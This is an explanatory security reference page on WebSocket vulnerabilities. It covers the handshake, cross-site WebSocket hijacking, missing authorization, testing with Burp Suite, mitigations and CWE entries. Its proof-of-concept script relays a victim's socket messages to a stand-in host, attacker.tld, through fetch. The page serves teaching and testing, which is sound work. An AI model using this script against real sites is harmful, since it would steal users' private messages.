# What is WebSocket Security?

WebSockets give a web app a persistent, two-way connection (chat, live dashboards, trading, notifications). They start as an HTTP request that "upgrades" to the `ws://` or `wss://` protocol, then stay open. Because testers often forget them, WebSocket endpoints frequently skip the auth, authorization, and input validation that the rest of the app enforces.

## How the handshake works

```http
GET /chat HTTP/1.1
Host: victim.tld
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Origin: https://victim.tld
```

After the server responds `101 Switching Protocols`, both sides send messages freely.

## Common vulnerabilities

- **Any vuln the messages carry** - WebSocket messages are just input. [XSS](XSS.md), [SQL injection](SQL%20Injection.md), and [command injection](Command%20Injection.md) all apply if the data is used unsafely.
- **Cross-Site WebSocket Hijacking (CSWSH)** - the handshake is a normal request. If the server authenticates it only by cookie and does **not check the `Origin` header** (like missing [CSRF](CSRF.md) protection), an attacker's page can open a WebSocket as the victim and read/send messages.
- **Missing authorization** - messages are trusted once connected; try acting on other users' objects ([IDOR](IDOR.md)) over the socket.
- **No rate limiting** - flood messages for DoS.
- **Sensitive data over `ws://`** (unencrypted) instead of `wss://`.

## CSWSH proof-of-concept

```html
<script>
var ws = new WebSocket("wss://victim.tld/chat");
ws.onopen = () => ws.send('{"action":"history"}');
ws.onmessage = e => fetch("https://attacker.tld/log?d=" + encodeURIComponent(e.data));
</script>
```

If the victim visits this page and messages come back, the handshake is not Origin-checked.

## How to test

1. Intercept the WebSocket in [Burp Suite](../../Tools/Burp%20Suite.md) (it has a dedicated WebSockets history and lets you edit/replay messages).
2. Fuzz every message field with your usual injection payloads.
3. Test CSWSH: replay the handshake with a different/absent `Origin`.
4. Try acting on other users' data over the socket (authorization).

## Mitigation

- Validate the `Origin` header on the handshake and use CSRF-style tokens.
- Authenticate and **re-check authorization on every message**, not just at connect.
- Validate and sanitize all message content like any other input.
- Use `wss://` (TLS) only; rate-limit messages and connections.

## CWE

- CWE-1385: Missing Origin Validation in WebSockets
- CWE-346: Origin Validation Error

## Deep dive

- [PortSwigger WebSocket labs](https://portswigger.net/web-security/websockets)
